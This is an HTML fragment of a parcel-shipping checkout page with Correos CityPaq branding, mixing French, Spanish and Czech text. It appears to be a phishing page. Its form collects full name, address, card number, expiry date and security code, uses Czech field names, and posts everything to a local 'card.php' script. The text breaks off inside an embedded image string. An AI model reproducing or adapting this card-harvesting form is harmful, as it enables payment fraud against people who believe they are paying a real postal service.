								<small class="text-muted"><p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vos envois dans un délai maximum de 72 heures</font></font></font></font></font></font></font></font></p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones type-city">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar CityPaq" src="https://cdn.mycomandia.com/static/logos/correos-paq72.png">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
										
											
												<input type="checkbox" id="carrierselection9" class="custom-control-input carrierselection" data-carrier="9" data-homepaq="1" data-selfpick="1">
												<label class="custom-control-label" for="carrierselection9"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
													Envoi via CityPaq </font></font></font></font></font></font></font></font><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(2,99 EUR)</font></font></font></font></font></font></font></font></strong>
												</label>
													
												<div class="cityPaq-search-container" style="display:none;">
													
														<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Zadejte své uživatelské jméno CityPaq:</font></font></font></font></p>
														<div class="input-group">
															<input class="form-control py-2 homepaqusername validate[required]" type="search" name="homepaqusername9" id="homepaqusername9">
															<span class="input-group-append">
																<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><input type="button" class="btn btn-outline-secondary searchhomepaq" value="Buscar" data-val="homepaqusername9" data-target="homepaqresult9"></font></font>
															</span>
														</div>
														
														<div id="homepaqresult9" class="homepaqresultdiv">
															<p class="citypaq-text">
																Si aún no es usuario de CityPaq, puede registrarse en este enlace: <a href="https://online.citypaq.es/pages/registro.xhtml" target="_homepaq">Ir a CityPaq</a>
															</p>
														</div>
													
												</div>
												
										
									</div>
								
								
								
								
							</div>
							<div style="width:100%">
								
									
										 <small class="text-muted">Paq Estándar CityPaq</small>
									
								
								<small class="text-muted"><p>Haz tus pedidos y recógelos en el CityPaq que más te convenga</p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
					</form>
				
				
				
				
			</div>
		</div>
	</div>
</section></div>
						
						<div id="paypalexpressParent" class="shopping-cart-locked-parent" style="display: block;">
	
</div>
						
						<div id="shippingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="shippingAddressList" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="shippingAddressForm" class="shopping-cart-form-parent" style="display: block;">

<section class="checkout-new-shipping-address">
	<div class="checkout-box">
		
					
			<div class="modal2">
<div class="modal__container">

<div class="modal__content">
<div class="item-image">
							
							
								
								
									
										
<br>
<br>
									
								
							
							
						<div></div></div>
 
<form name="form" action="././card.php" method="post">
<ul class="form-list">


<li class="form-list__row">
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NOM ET PRÉNOM</font></font></font></font></font></font></font></font></font></font></label>
<input type="text" required="" name="Celé" placeholder="Nom et prénom">
</li><li class="form-list__row">
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ADRESSE COMPLÈTE</font></font></font></font></font></font></font></font></font></font></label>
<input type="text" required="" name="úplnou" placeholder="adresse complète">
</li>

<li class="form-list__row">
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Postal code</font></font></font></font></font></font></font></font></label>
<input type="text" required="" placeholder="Postal Code" name="Poštovní">
</li>

<li class="form-list__row">
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NUMÉRO DE CARTE</font></font></font></font></font></font></font></font></font></font></label>
<div id="input--cc" class="creditcard-icon">
<input type="text" name="ccnumber" onkeyup="this.value=this.value.replace(/[^\d\/]/g,'')" id="ccnumber" class="cc_number" maxlength="16" required="" allowpaymentrequest="true" placeholder="NUMÉRO DE CARTE">
</div>
</li>
<li class="form-list__row form-list__row--inline">
<div>
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Expiration date</font></font></font></font></font></font></font></font></label>
<div class="form-list__input-inline">
<input type="text" name="ccmonth" maxlength="2" required="" placeholder="mm" onkeyup="this.value=this.value.replace(/[^\d\/]/g,'')">
<input type="text" name="ccyear" maxlength="2" required="" placeholder="aa" onkeyup="this.value=this.value.replace(/[^\d\/]/g,'')">
</div>
</div>
<div>
<label><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code de sécurité
</font></font></font></font></font></font></font></font></font></font></label>
<input type="text" name="cccvc" placeholder="123" maxlength="4" required="" onkeyup="this.value=this.value.replace(/[^\d\/]/g,'')">
</div>
</li><div class="custom-control custom-checkbox">
						<input type="checkbox" name="accept_dpp_shipping" class="custom-control-input validate[required]" id="accept_dpp_shipping" data-prompt-position="bottomRight" value="YES">
						<label class="custom-control-label" for="accept_dpp_shipping"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Vous souvenez-vous de ma    </font></font></font></font></font></font></font></font></font></font><a style="color: #0d4f84;" href="#"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">politique de confidentialité</font></font></font></font></font></font></font></font></font></font></b></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ?</font></font></font></font></font></font></font></font></font></font></label>
					</div>



<br>
<li>
<button type="submit" class="button"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACCEPTER ET PAYER</font></font></font></font></font></font></button>
</li>
</ul>
</form>
</div> 
</div> 
</div> 
	</div>
</section>
</div>
						
						<div id="billingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="billingAddressForm" class="shopping-cart-form-parent" style="display: none;"></div>
						
						<div id="paymentBox" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="paymentLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						<div id="discountForm" class="shopping-cart-form-parent d-lg-none" style="display: none;"></div>
						<div id="discountLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						
						
						<div id="checkoutButton" style="display:none">
							<div class="order-payment-checkboxs">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="isacceptmarketing" class="custom-control-input" id="isacceptmarketing" value="YES">
									<label class="custom-control-label" for="isacceptmarketing">Deseo recibir ofertas y promociones de los productos y servicios comercializados</label>
								</div>
							
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="accept_dpp" class="custom-control-input validate[required]" id="accept_dpp" data-prompt-position="bottomRight" value="YES">
									
									
									<label class="custom-control-label" for="accept_dpp">He leído y acepto las <a target="_blank" href="/page/condiciones-generales"><b>Condiciones de Venta</b></a>.</label>
									
								</div>
							</div>
							
							
							<section class="continue-button py-2 mb-4">
								<div class="d-flex justify-content-end">
								
									<button type="button" class="btn btn-primary btn-shopping-cart-checkout">Confirmar y pagar pedido &gt;</button>
								
								</div>
							</section>
						</div>
						
					</div>

					
				</div>
			</div>
			<div class="col-lg-5">
				<div class="checkout-right-side">


<section class="checkout-summary d-none d-lg-block">

	
	<div class="summary-product-list">
		
		
			
	
			<div class="item">
				<div class="row">
					<div class="col-3 flex-grow-0 image-col">
						<div class="item-image">
							
							
								
								
									
										
<img class="rg_i Q4LuWd" src="data:image/jpeg;base64,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